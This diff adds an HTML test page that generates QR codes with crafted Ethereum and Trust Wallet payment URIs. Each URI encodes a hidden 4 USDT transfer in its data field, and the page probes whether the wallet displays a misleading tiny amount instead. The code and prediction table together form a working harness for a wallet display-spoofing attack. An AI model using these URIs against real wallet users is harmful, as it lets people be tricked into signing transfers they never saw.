@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TW — Android Value + Data</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f1a; color: #e0e0f0; padding: 20px; max-width: 800px; margin: 0 auto; }
+  h1 { font-size: 20px; color: #f0f0ff; margin-bottom: 4px; }
+  .subtitle { color: #8888bb; font-size: 13px; margin-bottom: 20px; }
+  .card { background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 12px; padding: 16px; margin-bottom: 14px; }
+  h2 { font-size: 14px; color: #bbbbff; border-bottom: 1px solid #2a2a3a; padding-bottom: 6px; margin-bottom: 8px; }
+  .uri { font-size: 10px; color: #aaccff; word-break: break-all; background: #0a0a15; padding: 6px; border-radius: 4px; margin: 6px 0 8px; font-family: monospace; }
+  .qr-row { display: flex; justify-content: space-around; flex-wrap: wrap; gap: 10px; }
+  .qr-cell { text-align: center; background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 10px; padding: 12px; }
+  .qr-cell .letter { font-size: 16px; font-weight: bold; color: #bbbbff; margin-bottom: 4px; }
+  .qr-cell img { border-radius: 8px; width: 160px; height: 160px; border: 2px solid #2a2a3a; background: white; padding: 4px; }
+  .box { background: #1a2a1a; color: #88dd88; border-left: 3px solid #44aa44; font-size: 12px; padding: 6px 10px; border-radius: 4px; }
+  .box.red { background: #2a1a1a; color: #dd8888; border-color: #aa4444; }
+  table { width:100%; border-collapse: collapse; font-size: 12px; margin: 10px 0; }
+  th, td { padding: 6px 8px; border-bottom: 1px solid #2a2a3a; text-align: left; }
+  th { background: #2a2a3a; }
+  textarea { width:100%; padding: 8px; border-radius: 6px; border: 1px solid #3a3a5a; background: #0a0a15; color: #e0e0f0; font-size: 12px; margin-top: 6px; font-family: inherit; }
+</style>
+</head>
+<body>
+
+<h1>🔬 Android — Value + Data Focus</h1>
+<p class="subtitle">Adding tiny ETH values to unlock the CONFIRM button. Scan with built-in camera (top-right).</p>
+
+<div class="box red" style="margin-bottom:16px;">
+<strong>⚡ From previous test:</strong> Test A (pure data, no value, no function) → shows 0 ETH, confirm DISABLED. <strong>Theory: wallet needs value &gt; 0 or recognized function to enable confirm for contract_generic.</strong> These tests add 0.0001 ETH (≈ $0.30) to pass the check.
+</div>
+
+<div id="qrs"></div>
+
+<table>
+<tr><th>ID</th><th>Format</th><th>Prediction</th></tr>
+<tr><td><strong>A</strong></td><td style="font-family:monospace;font-size:10px;">ethereum:0xUSDT@1?value=0.0001&data=&lt;4U&gt;</td><td>Shows ~0.0001 ETH → confirm enabled → data executes 4 USDT transfer. USDT contract might reject the 0.0001 ETH but the data runs separately... OR whole TX reverts.</td></tr>
+<tr><td><strong>B</strong></td><td style="font-family:monospace;font-size:10px;">ethereum:0xUSDT@1/transfer?address=RCP&uint256=1&data=&lt;4U&gt;</td><td>Shows 0.000001 USDT (erc20_transfer). amount=1 is tiny (like $0.000001). erc20_transfer ignores data. 1 wei of USDT transfers.</td></tr>
+<tr><td><strong>C</strong></td><td style="font-family:monospace;font-size:10px;">trust://send?asset=USDT&address=RCP&amount=4000000&data=&lt;4U&gt;</td><td>Shows 4 USDT (erc20_transfer). erc20_transfer ignores data. 4 USDT actually transfers — this is the honest path, as control.</td></tr>
+<tr><td><strong>D</strong></td><td style="font-family:monospace;font-size:10px;">trust://send?address=USDT&amount=0.0001&data=&lt;4U&gt;</td><td>No asset param → contract_generic. Shows 0.0001 ETH sent to USDT contract. data passes through. 4 USDT transfers, 0.0001 ETH may be rejected.</td></tr>
+</table>
+
+<div id="results"></div>
+
+<script>
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RCP = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
+// transfer(0xf39..., 4000000 = 4 USDT with 6 decimals)
+const ABI = '0xa9059cbb' +
+  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
+  '00000000000000000000000000000000000000000000000000000000003d0900';
+
+// 0.0001 ETH in wei for value param (in ETH units for EIP-681)
+const ETH_VAL = '0.0001';
+
+const TESTS = [
+  { id: 'qrA', label: 'A',
+    uri: 'ethereum:' + USDT + '@1?value=' + ETH_VAL + '&data=' + ABI },
+  { id: 'qrB', label: 'B',
+    uri: 'ethereum:' + USDT + '@1/transfer?address=' + RCP + '&uint256=1&data=' + ABI },
+  { id: 'qrC', label: 'C',
+    uri: 'trust://send?asset=' + USDT + '&address=' + RCP + '&amount=4000000&data=' + ABI },
+  { id: 'qrD', label: 'D',
+    uri: 'trust://send?address=' + USDT + '&amount=' + ETH_VAL + '&data=' + ABI },
+];
+
+function qrSrc(u) {
+  return 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(u);
+}
+
+// QR grid
+var q = '<div class="qr-row">';
+TESTS.forEach(function(t) {
+  q += '<div class="qr-cell"><div class="letter">' + t.label + '</div><img src="' + qrSrc(t.uri) + '" alt="QR ' + t.label + '" loading="lazy"></div>';
+});
+q += '</div>';
+document.getElementById('qrs').innerHTML = q;
+
+// Result cards
+var r = '';
+TESTS.forEach(function(t) {
+  r += '<div class="card"><h2>Test ' + t.label + '</h2><div class="uri">' + t.uri + '</div><textarea rows="2" placeholder="What shows on screen? NEXT? CONFIRM? Result?" id="r-' + t.id + '"></textarea></div>';
+});
+document.getElementById('results').innerHTML = r;
+</script>
+
+</body>
+</html>
